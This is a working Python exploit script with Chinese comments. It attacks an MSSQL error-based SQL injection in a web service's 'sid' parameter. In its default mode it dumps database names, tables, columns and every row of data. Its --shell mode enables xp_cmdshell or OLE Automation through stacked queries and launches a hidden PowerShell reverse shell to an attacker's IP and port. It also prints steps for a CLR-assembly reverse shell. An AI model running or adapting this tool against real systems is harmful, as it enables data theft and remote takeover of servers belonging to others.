#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import sys
import time
import html
import argparse

# 解析命令行参数
parser = argparse.ArgumentParser(description='MSSQL Error-based injection exploit')
parser.add_argument('url', help='Target URL (e.g., http://example.com/WebService/StaffService.asmx/GetPositionOfStaff)')
parser.add_argument('--shell', metavar='IP:PORT', help='Attempt to get a reverse shell via multiple methods (requires sysadmin)')
args = parser.parse_args()

BASE_URL = args.url.rstrip('/')
HEADERS = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
}

ERROR_PATTERN = re.compile(r"在将\s*\.?nvarchar\s*值 '([^']+)' 转换成数据类型 int 时失败", re.IGNORECASE)

def send_payload(payload):
    """发送payload，返回提取的数据，失败返回None"""
    data = {'sid': payload}
    try:
        resp = requests.post(BASE_URL, headers=HEADERS, data=data, timeout=10)
        if resp.status_code != 500:
            return None
        decoded = html.unescape(resp.text)
        if "在位置 0 处没有任何行" in decoded:
            return None
        match = ERROR_PATTERN.search(decoded)
        if match:
            return match.group(1)
        else:
            return None
    except Exception as e:
        print(f"[!] 请求异常: {e}")
        return None

def check_privileges():
    """检查当前用户是否为sysadmin及xp_cmdshell状态，同时检查Ole Automation Procedures状态"""
    print("[*] 正在检查数据库权限...")
    
    # 1. 检查是否sysadmin
    payload_sysadmin = "(SELECT 'R' + CONVERT(nvarchar, IS_SRVROLEMEMBER('sysadmin')))"
    result_sysadmin = send_payload(payload_sysadmin)
    if result_sysadmin and result_sysadmin.startswith('R'):
        is_sysadmin = result_sysadmin[1:] == '1'
        if is_sysadmin:
            print("[+] 当前用户是 sysadmin 角色")
        else:
            print("[-] 当前用户不是 sysadmin 角色")
    else:
        is_sysadmin = False
        print("[-] 无法检测 sysadmin 角色，可能权限不足或注入失败")
    
    # 2. 检查xp_cmdshell是否启用
    payload_xp = "(SELECT 'R' + CONVERT(nvarchar, value_in_use) FROM sys.configurations WHERE name='xp_cmdshell')"
    result_xp = send_payload(payload_xp)
    if result_xp and result_xp.startswith('R'):
        xp_enabled = result_xp[1:] == '1'
        if xp_enabled:
            print("[+] xp_cmdshell 当前已启用")
        else:
            print("[-] xp_cmdshell 当前未启用")
    else:
        xp_enabled = False
        print("[-] 无法检测 xp_cmdshell 状态，可能配置表不可访问或未启用")
    
    # 3. 检查Ole Automation Procedures是否启用
    payload_ole = "(SELECT 'R' + CONVERT(nvarchar, value_in_use) FROM sys.configurations WHERE name='Ole Automation Procedures')"
    result_ole = send_payload(payload_ole)
    if result_ole and result_ole.startswith('R'):
        ole_enabled = result_ole[1:] == '1'
        if ole_enabled:
            print("[+] Ole Automation Procedures 当前已启用")
        else:
            print("[-] Ole Automation Procedures 当前未启用")
    else:
        ole_enabled = False
        print("[-] 无法检测 Ole Automation Procedures 状态")
    
    return is_sysadmin, xp_enabled, ole_enabled

def attempt_shell(ip, port):
    """尝试通过xp_cmdshell反弹shell，先检查权限，再分步启用和执行"""
    print(f"[*] 目标反弹至 {ip}:{port}")
    
    is_sysadmin, xp_enabled, ole_enabled = check_privileges()
    
    if not is_sysadmin:
        print("[-] 权限不足：当前用户不是 sysadmin，无法执行任何命令执行方法。")
        return
    
    # 构造PowerShell反弹命令（需转义单引号）
    ps_command = f'''$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'''
    ps_command_escaped = ps_command.replace("'", "''")

    # ---------- 方法1：xp_cmdshell ----------
    print("\n[*] === 尝试方法1：xp_cmdshell ===")
    # 启用 xp_cmdshell
    if not xp_enabled:
        print("[*] 尝试启用 xp_cmdshell...")
        enable_xp_sql = "IF (1=1) BEGIN EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; END--"
        payload_enable = f"';{enable_xp_sql}"
        send_payload(payload_enable)
        time.sleep(1)
        # 再次检查状态
        result_xp = send_payload("(SELECT 'R' + CONVERT(nvarchar, value_in_use) FROM sys.configurations WHERE name='xp_cmdshell')")
        if result_xp and result_xp.startswith('R'):
            xp_enabled = result_xp[1:] == '1'
            if xp_enabled:
                print("[+] xp_cmdshell 成功启用！")
            else:
                print("[-] xp_cmdshell 启用失败")
        else:
            print("[-] 无法验证 xp_cmdshell 状态")
    else:
        print("[*] xp_cmdshell 已启用")

    if xp_enabled:
        # 执行命令
        cmd_sql = f"IF (1=1) BEGIN EXEC master..xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"{ps_command_escaped}\"'; END--"
        payload_cmd = f"';{cmd_sql}"
        print("[*] 发送 xp_cmdshell 命令...")
        send_payload(payload_cmd)
        print("[*] 命令已发送，请检查监听器。若未收到连接，可能网络不通或命令被拦截。")
        return  # 无论成功与否，尝试一种方法后返回（因为可能已经成功）
    else:
        print("[-] xp_cmdshell 无法使用，尝试下一种方法。")

    # ---------- 方法2：sp_oacreate ----------
    print("\n[*] === 尝试方法2：sp_oacreate (OLE自动化) ===")
    if not ole_enabled:
        print("[*] 尝试启用 Ole Automation Procedures...")
        enable_ole_sql = "IF (1=1) BEGIN EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; END--"
        payload_enable = f"';{enable_ole_sql}"
        send_payload(payload_enable)
        time.sleep(1)
        # 再次检查状态
        result_ole = send_payload("(SELECT 'R' + CONVERT(nvarchar, value_in_use) FROM sys.configurations WHERE name='Ole Automation Procedures')")
        if result_ole and result_ole.startswith('R'):
            ole_enabled = result_ole[1:] == '1'
            if ole_enabled:
                print("[+] Ole Automation Procedures 成功启用！")
            else:
                print("[-] Ole Automation Procedures 启用失败")
        else:
            print("[-] 无法验证 Ole Automation Procedures 状态")
    else:
        print("[*] Ole Automation Procedures 已启用")

    if ole_enabled:
        # 通过 sp_oacreate 执行命令
        # 构造 SQL：声明变量，创建 wscript.shell 对象，调用 run 方法
        # run 的第二个参数为 0 表示隐藏窗口，异步执行
        ole_cmd_sql = f"""
        IF (1=1) BEGIN
            DECLARE @shell INT;
            EXEC sp_oacreate 'wscript.shell', @shell OUTPUT;
            EXEC sp_oamethod @shell, 'run', NULL, 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"{ps_command_escaped}\"', 0;
        END--
        """
        # 移除换行和多余空格，但为清晰保留换行；注入时需将整个语句作为 payload
        # 将多行合并为一行，并用空格分隔
        ole_cmd_sql = ' '.join(ole_cmd_sql.split())
        payload_ole = f"';{ole_cmd_sql}"
        print("[*] 发送 sp_oacreate 命令...")
        send_payload(payload_ole)
        print("[*] 命令已发送，请检查监听器。若未收到连接，可能网络不通或命令被拦截。")
        return
    else:
        print("[-] Ole Automation Procedures 无法使用。")

    # ---------- 方法3：CLR 程序集 ----------
    print("\n[*] === 尝试方法3：CLR 程序集注入 ===")
    print("[!] 前两种方法均失败，CLR 注入需要手动构造程序集十六进制，较为复杂。")
    print("[*] 以下是 CLR 注入的步骤指南：")
    print("    1. 使用 Visual Studio 或在线工具生成一个 C# 反弹 shell 的 DLL（权限集 UNSAFE）。")
    print("    2. 将 DLL 转换为十六进制字符串（可用工具如 bin2hex）。")
    print("    3. 通过注入点执行以下 SQL（注意闭合和换行）：")
    print("""
    IF (1=1) BEGIN
        -- 启用 CLR
        EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
        EXEC sp_configure 'clr enabled', 1; RECONFIGURE;
        -- 设置数据库为可信任
        ALTER DATABASE [当前数据库名] SET TRUSTWORTHY ON;
        -- 加载程序集（假设十六进制串为 0x4D5A...）
        CREATE ASSEMBLY [ReverseShell] FROM 0x4D5A... WITH PERMISSION_SET = UNSAFE;
        -- 创建存储过程
        CREATE PROCEDURE [dbo].[ExecReverse] AS EXTERNAL NAME [ReverseShell].[StoredProcedures].[Reverse];
        -- 执行
        EXEC [dbo].[ExecReverse];
    END--
    """)
    print("[*] 更多细节可搜索 'MSSQL CLR reverse shell' 获取现成的十六进制串。")
    print("[-] 所有自动尝试均失败，请根据以上指引手动尝试。")

# 如果指定了--shell，则进入shell模式
if args.shell:
    try:
        ip, port_str = args.shell.split(':')
        port = int(port_str)
        attempt_shell(ip, port)
        sys.exit(0)
    except ValueError:
        print("[-] --shell 格式错误，应为 IP:PORT")
        sys.exit(1)

# ========== 以下是原有的交互式数据提取模式 ==========
def get_db_name():
    print("[*] 正在获取数据库名...")
    db = send_payload("db_name()")
    if db:
        print(f"[+] 数据库名: {db}")
        return db
    else:
        print("[-] 获取数据库名失败")
        return None

def get_tables(keyword=None):
    print(f"[*] 正在获取表名" + (f" (关键词: {keyword})" if keyword else ""))
    tables = []
    index = 1
    while True:
        base_condition = "table_type='BASE TABLE'"
        if keyword:
            safe_keyword = keyword.replace("'", "''")
            base_condition += f" AND table_name LIKE '%{safe_keyword}%'"

        if index == 1:
            payload = f"(SELECT TOP 1 table_name FROM information_schema.tables WHERE {base_condition})"
        else:
            subquery = f"(SELECT TOP {index-1} table_name FROM information_schema.tables WHERE {base_condition})"
            payload = f"(SELECT TOP 1 table_name FROM information_schema.tables WHERE {base_condition} AND table_name NOT IN {subquery})"

        table = send_payload(payload)
        if table is None:
            break

        print(f"    [第{len(tables)+1}个] {table}")
        tables.append(table)
        index += 1
        time.sleep(0.3)

        if len(tables) % 20 == 0:
            choice = input(f"已获取 {len(tables)} 个表，是否继续？(y/n, 默认y): ").strip().lower()
            if choice == 'n':
                break

    if tables:
        print(f"[+] 共获取 {len(tables)} 个表")
    else:
        print("[-] 未找到任何表")
    return tables

def get_columns(table_name):
    print(f"[*] 正在获取表 [{table_name}] 的列名...")
    columns = []
    index = 1
    while True:
        if index == 1:
            payload = f"(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='{table_name}')"
        else:
            payload = f"(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='{table_name}' AND column_name NOT IN (SELECT TOP {index-1} column_name FROM information_schema.columns WHERE table_name='{table_name}'))"
        col = send_payload(payload)
        if col is None:
            break
        print(f"    [第{index}列] {col}")
        columns.append(col)
        index += 1
        time.sleep(0.3)

    if not columns:
        print(f"[-] 未找到表 [{table_name}] 的列")
        return None, None

    print("[*] 正在获取各列的数据类型...")
    col_types = {}
    for col in columns:
        payload = f"(SELECT TOP 1 data_type FROM information_schema.columns WHERE table_name='{table_name}' AND column_name='{col}')"
        typ = send_payload(payload)
        if typ is None:
            typ = "unknown"
        col_types[col] = typ
        print(f"    {col} : {typ}")
        time.sleep(0.3)

    print(f"[+] 表 [{table_name}] 共有 {len(columns)} 列")
    return columns, col_types

def get_data(table_name, columns, col_types):
    # 先获取总行数
    print(f"[*] 正在统计表 [{table_name}] 的总行数...")
    count_payload = f"(SELECT 'R' + CONVERT(nvarchar, COUNT(*)) FROM [{table_name}])"
    count_str = send_payload(count_payload)
    if count_str and count_str.startswith('R'):
        try:
            total_rows = int(count_str[1:])
            print(f"[+] 表 [{table_name}] 共有 {total_rows} 行数据")
        except:
            print(f"[-] 行数转换失败，返回：{count_str}")
            return []
    else:
        print("[-] 无法获取行数，可能表不存在或为空")
        return []

    if total_rows == 0:
        print("[-] 表为空")
        return []

    # 构造列转换表达式（增加 ISNULL 处理 NULL 值）
    col_exprs = []
    for col in columns:
        typ = col_types.get(col, "").lower()
        if typ in ("timestamp", "rowversion"):
            expr = f"ISNULL(CONVERT(nvarchar, CAST([{col}] AS varbinary), 1), '')"
        else:
            expr = f"ISNULL(CONVERT(nvarchar, [{col}]), '')"
        col_exprs.append(expr)
    col_expr = " + '|' + ".join(col_exprs)

    data_rows = []
    for rn in range(1, total_rows + 1):
        col_list = [f"[{col}]" for col in columns]
        payload = f"(SELECT {col_expr} FROM (SELECT {', '.join(col_list)}, ROW_NUMBER() OVER (ORDER BY (SELECT 1)) AS rn FROM [{table_name}]) AS t WHERE rn={rn})"
        row_data = send_payload(payload)
        if row_data is None:
            print(f"[-] 第 {rn} 行获取失败，停止")
            break
        print(f"    [第{rn}行] {row_data}")
        data_rows.append(row_data)
        time.sleep(0.3)

        if rn % 20 == 0 and rn < total_rows:
            choice = input(f"已获取 {rn} 行，共 {total_rows} 行。是否继续？(y/n, 默认y): ").strip().lower()
            if choice == 'n':
                print(f"[*] 用户选择停止，共获取 {len(data_rows)} 行")
                break

    print(f"[+] 表 [{table_name}] 共获取 {len(data_rows)} 行数据")
    return data_rows

def main():
    print("[+] 目标: " + BASE_URL)
    db_name = get_db_name()

    keyword = input("\n请输入要筛选的表名关键词（直接回车获取所有表）: ").strip()
    if keyword == "":
        keyword = None

    tables = get_tables(keyword)
    if not tables:
        print("[-] 没有找到任何表，退出。")
        return

    print("\n" + "="*50)
    print("可用的表列表:")
    show_count = min(len(tables), 50)
    for idx, t in enumerate(tables[:show_count], 1):
        print(f"  {idx}. {t}")
    if len(tables) > 50:
        print(f"  ... 共 {len(tables)} 个表，以上仅显示前50个")

    while True:
        choice = input("\n请输入要查询的表名（或输入序号）: ").strip()
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(tables):
                selected_table = tables[idx-1]
                break
            else:
                print("序号超出范围，请重新输入")
        elif choice in tables:
            selected_table = choice
            break
        else:
            print("输入的表名不存在，请重新输入")

    print(f"\n[+] 您选择了表: {selected_table}")
    columns, col_types = get_columns(selected_table)
    if not columns:
        print("[-] 无法获取列信息，退出。")
        return

    get_data(selected_table, columns, col_types)
    print("\n[+] 所有操作完成。")

if __name__ == "__main__":
    main()